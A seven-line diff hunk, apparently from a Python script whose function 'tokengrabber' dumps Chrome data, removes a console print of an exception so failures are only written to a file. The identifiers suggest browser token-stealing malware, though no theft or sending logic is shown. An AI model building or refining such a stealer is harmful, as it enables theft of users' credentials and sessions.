@@ -293,7 +293,6 @@ def tokengrabber():
 	try:
 		chrome_dump = chrome()
 	except Exception as e:
-		print(e)
 		with open(comepleteName,'w') as l:
 			l.write('not available\n')
 			l.write(str(e))
